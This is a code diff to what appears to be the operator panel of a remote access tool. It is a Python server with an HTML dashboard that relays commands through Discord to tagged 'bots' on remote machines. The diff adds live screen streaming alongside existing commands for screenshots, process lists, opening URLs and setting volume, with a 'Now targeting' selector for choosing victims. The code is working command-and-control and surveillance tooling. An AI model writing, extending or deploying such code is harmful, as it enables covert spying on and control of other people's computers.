@@ -240,6 +240,7 @@ async def on_message(message: discord.Message):
                 await tag_ch.send(f"Discovered receiver tag: {tag}")
             except Exception as exc:
                 print(f"[TAG] failed to broadcast {tag}: {exc}")
+        is_live_frame = "LIVE_STREAM_FRAME" in (message.content or "")
         payload = {
             "type": "text",
             "author": str(message.author),
@@ -247,9 +248,13 @@ async def on_message(message: discord.Message):
             "attachments": [],
             "ts": message.created_at.isoformat(),
             "tag": tag,
+            "is_live_frame": is_live_frame,
         }
         # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
+            if is_live_frame:
+                payload["attachments"].append({"filename": att.filename, "url": att.url})
+                continue
             try:
                 b = await att.read()
                 fname = f"{att.id}_{att.filename}"
@@ -318,6 +323,10 @@ PANEL_HTML = r"""<!doctype html>
     .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:220px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:var(--text);} label{font-weight:700;}
     .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
     .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
+    .live-frame{border:1px solid var(--line); border-radius:12px; background:radial-gradient(60% 60% at 30% 30%, rgba(95,224,197,.1), transparent), radial-gradient(50% 60% at 70% 40%, rgba(77,130,255,.12), transparent), #0c1220; min-height:280px; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;}
+    .live-frame img{max-width:100%; width:100%; height:auto; object-fit:contain; display:none;}
+    .live-frame.active img{display:block;}
+    .live-frame .muted{position:absolute; inset:auto; margin:auto;}
     #toast{position:fixed; left:50%; bottom:18px; transform:translateX(-50%); padding:9px 14px; border-radius:12px; border:1px solid var(--line); background:var(--panel); font-weight:700; opacity:0; transition:opacity .18s ease; z-index:120;}
   </style>
 </head>
@@ -353,6 +362,7 @@ PANEL_HTML = r"""<!doctype html>
     <div class="shell">
       <div class="tabbar">
         <button class="tab-btn active" data-tab="dash">Dashboard</button>
+        <button class="tab-btn" data-tab="live">Live stream</button>
         <button class="tab-btn" data-tab="shots">Screenshots</button>
         <button class="tab-btn" data-tab="procs">Processes</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
@@ -362,20 +372,6 @@ PANEL_HTML = r"""<!doctype html>
           <div class="grid">
             <div class="card">
               <div class="head">
-                <div><div class="eyebrow">Live</div><h3>Stream control</h3></div>
-                <div class="row" style="gap:6px">
-                  <input id="monitorIdx" style="max-width:80px" placeholder="1" value="1"/>
-                  <button class="btn primary" onclick="startLive()">Start live</button>
-                </div>
-              </div>
-              <div class="stack" style="margin-bottom:12px">
-                <label for="streamUrl">Open existing stream URL</label>
-                <div class="row">
-                  <input id="streamUrl" placeholder="http://host:8081/stream"/>
-                  <button class="btn" onclick="viewStream()">Open overlay</button>
-                </div>
-              </div>
-              <div class="head" style="margin-top:6px">
                 <div><div class="eyebrow">Quick actions</div><h3>Commands</h3></div>
               </div>
               <div class="stack">
@@ -418,6 +414,30 @@ PANEL_HTML = r"""<!doctype html>
           </div>
         </div>
 
+        <div id="tab-live" class="view" aria-hidden="true">
+          <div class="card" style="height:100%; display:flex; flex-direction:column; gap:14px;">
+            <div class="head">
+              <div><div class="eyebrow">Live</div><h3>Screen share</h3></div>
+              <div id="liveControls" class="row" style="gap:8px">
+                <button class="btn primary" onclick="startLiveStream()">Start</button>
+                <button class="btn" onclick="stopLiveStream()">Stop</button>
+              </div>
+            </div>
+            <div id="liveGate" class="pill" style="background:rgba(255,255,255,0.03); color:var(--muted);">
+              Select a bot first to start a live stream.
+            </div>
+            <div id="liveBody" class="stack" style="gap:12px;">
+              <div class="pill" style="display:flex; gap:8px; align-items:center; width:max-content;">
+                <span id="liveDot" class="dot"></span><span id="liveStatus">Idle</span>
+              </div>
+              <div class="live-frame">
+                <div class="muted" id="liveHint">Click start to request a screenshare.</div>
+                <img id="liveFrame" alt="Live stream" />
+              </div>
+            </div>
+          </div>
+        </div>
+
         <div id="tab-shots" class="view" aria-hidden="true">
           <div class="card" style="height:100%; display:flex; flex-direction:column;">
             <div class="head">
@@ -453,9 +473,12 @@ PANEL_HTML = r"""<!doctype html>
   <div id="toast"></div>
 
   <script>
-    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList')};
-    let currentTag = "{BOT_TAG}";
+    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'), liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'), liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls')};
+    const defaultTag = "{BOT_TAG}";
+    let currentTag = defaultTag;
     let knownTags = new Set([currentTag]);
+    let hasSelectedTag = false;
+    let liveActive = false;
     let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
 
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
@@ -480,9 +503,11 @@ PANEL_HTML = r"""<!doctype html>
           el.tagList.appendChild(chip);
         });
       }
+      updateLiveGate();
     }
-    async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; } catch(e){} renderTags(); }
-    async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); }
+    function updateLiveGate(){ const ready=hasSelectedTag || (currentTag && currentTag!==defaultTag); if(ready) hasSelectedTag=true; if(el.liveGate) el.liveGate.style.display = ready?'none':'flex'; if(el.liveBody) el.liveBody.style.opacity = ready?'1':'0.55'; if(el.liveControls){ el.liveControls.querySelectorAll('button').forEach(b=> b.disabled=!ready); } }
+    async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; if(currentTag && currentTag!==defaultTag) hasSelectedTag=true; } catch(e){} renderTags(); updateLiveGate(); }
+    async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; hasSelectedTag=true; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); updateLiveGate(); }
     function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
     const tagRegex = /(^|\\s)(\\[[^\\[\\]\\r\\n]{2,32}\\])/;
     function parseTag(text){ const m=(text||'').match(tagRegex); return m?m[2]:null; }
@@ -490,9 +515,9 @@ PANEL_HTML = r"""<!doctype html>
       const found = (obj&&obj.tag) || parseTag(obj&&obj.content);
       if(found){
         knownTags.add(found);
-        const isDefault=currentTag==="{BOT_TAG}" || !currentTag || !knownTags.has(currentTag);
-        if(isDefault) currentTag = found;
-        renderTags();
+        const isDefault=currentTag===defaultTag || !currentTag || !knownTags.has(currentTag);
+        if(isDefault){ currentTag = found; hasSelectedTag=true; }
+        renderTags(); updateLiveGate();
       }
     }
 
@@ -503,7 +528,7 @@ PANEL_HTML = r"""<!doctype html>
     function addLog(div){ addFeed(el.logFeed, div, 300); }
 
     function setTab(id){
-      ['dash','shots','procs','logs'].forEach(t=>{
+      ['dash','live','shots','procs','logs'].forEach(t=>{
         const view=document.getElementById(`tab-${t}`);
         const active=t===id;
         view.classList.toggle('active', active);
@@ -513,12 +538,14 @@ PANEL_HTML = r"""<!doctype html>
     }
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
-    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
+    function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); if(el.liveHint) el.liveHint.style.display='none'; } setLiveStatus('Receiving frames', 'ok'); }
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR'); if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); } catch(e){ toast(e.message);} }
-    async function viewStream(){ const url=document.getElementById('streamUrl').value.trim(); if(!url){toast('Enter stream URL'); return;} try{ await post('/cmd/show_stream?url='+encodeURIComponent(url)); toast('Stream overlay sent'); } catch(e){ toast(e.message);} }
+    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start'); toast('Live request sent'); setLiveStatus('Waiting for frames...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
+    async function stopLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); return; } try{ await post('/cmd/live/stop'); toast('Stop request sent'); setLiveStatus('Stopping...', 'pending'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
     async function openLink(){ const url=document.getElementById('openUrl').value.trim(); if(!url){toast('Enter a URL'); return;} const safe=(url.startsWith('http://')||url.startsWith('https://'))?url:'http://'+url; try{ await post('/cmd/open?url='+encodeURIComponent(safe)); toast('Open link sent'); } catch(e){ toast(e.message);} }
@@ -630,15 +657,15 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
     await _send_cmd(f"{_resolve_tag(tag)} SET_VOLUME {pct_val}")
     return JSONResponse({"ok": True, "pct": pct_val})
 
-@app.post("/cmd/live_start")
-async def cmd_live_start(monitor: int = Query(1, ge=1), tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} START_LIVE {monitor}")
-    return JSONResponse({"ok": True, "monitor": monitor})
+@app.post("/cmd/live/start")
+async def cmd_live_start(tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_START")
+    return JSONResponse({"ok": True})
 
-@app.post("/cmd/show_stream")
-async def cmd_show_stream(url: str = Query(..., min_length=1), tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} SHOW_STREAM {url}")
-    return JSONResponse({"ok": True, "url": url})
+@app.post("/cmd/live/stop")
+async def cmd_live_stop(tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_STOP")
+    return JSONResponse({"ok": True})
 
 @app.post("/cmd/display_gif")
 async def cmd_display_gif(tag: str = Query(None)):
